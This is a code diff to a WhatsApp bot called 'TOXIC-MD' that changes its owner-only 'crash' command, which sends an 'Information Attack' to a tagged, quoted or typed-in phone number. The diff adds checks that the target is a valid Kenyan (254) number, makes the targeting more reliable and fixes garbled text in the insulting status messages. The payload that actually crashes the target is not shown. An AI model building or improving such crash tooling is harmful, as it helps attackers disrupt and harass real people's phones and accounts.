@@ -9,6 +9,12 @@ const normalizeNumber = (number) => {
   return number.replace(/[^0-9]/g, '').replace(/^0+/, '').replace(/^\+254/, '254') || number;
 };
 
+// Validate phone number
+const isValidPhoneNumber = (number) => {
+  const cleaned = number.replace(/[^0-9]/g, '');
+  return /^254[0-9]{9}$/.test(cleaned); // Must start with 254 and have 9 digits
+};
+
 // Sleep function for delay
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -133,13 +139,14 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
   }
 
   // Extract and validate target
-  let client = ms.mentionedJid[0] ? ms.mentionedJid[0] : ms.quoted ? ms.quoted.sender : arg[0].replace(/[^0-9]/g, '');
-  if (!client) {
-    console.log(`[DEBUG] crash: Invalid target provided`);
+  let client = ms.mentionedJid[0] ? ms.mentionedJid[0] : ms.quoted ? ms.quoted.sender : arg[0];
+  let clientNumber = client.includes('@s.whatsapp.net') ? client.split('@')[0] : client.replace(/[^0-9]/g, '');
+  if (!isValidPhoneNumber(clientNumber)) {
+    console.log(`[DEBUG] crash: Invalid target number: ${clientNumber}`);
     await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ IDIOT, ${userName}! 😤 Invalid target number! Use: .crash 254xxx or tag/quote a user! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
     return;
   }
-  const isTarget = client.includes('@s.whatsapp.net') ? client : `${client}@s.whatsapp.net`;
+  const isTarget = client.includes('@s.whatsapp.net') ? client : `${clientNumber}@s.whatsapp.net`;
   console.log(`[DEBUG] crash: Target set to ${isTarget}`);
 
   // Send processing reaction
@@ -172,12 +179,12 @@ zokou({ nomCom: "crash", categorie: "Owner", reaction: "☠️" }, async (dest, 
       console.log(`[DEBUG] crash: Error sending success reaction: ${e.message}`);
     }
 
-    // Send success message
-    const successMessage = `𝐓𝐎𝐗𝐈𝐂-�{M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${client.split('@')[0]}\n│❒ Status: Success\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`;
+    // Send confirmation message
+    const successMessage = `𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ *Information Attack*\n│❒ Target: ${clientNumber}\n│❒ Status: Success\n│❒ Powered by xh_clinton\n◈━━━━━━━━━━━━━━━━◈`;
     await repondre(successMessage);
-    console.log(`[DEBUG] crash: Success message sent`);
+    console.log(`[DEBUG] crash: Confirmation message sent`);
   } catch (e) {
     console.log(`[DEBUG] crash: Error during attack: ${e.message}`);
-    await repondre(`𝐓𝐎𝐗𝐈𝐂-�{M𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${client.split('@')[0]} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
+    await repondre(`𝐓𝐎𝐗𝐈𝐂-𝐌𝐃\n\n◈━━━━━━━━━━━━━━━━◈\n│❒ OUTRAGEOUS, ${userName}! 😤 Attack on ${clientNumber} failed: ${e.message}! This system will PAY for its incompetence! 🚫\n◈━━━━━━━━━━━━━━━━◈`);
   }
 });
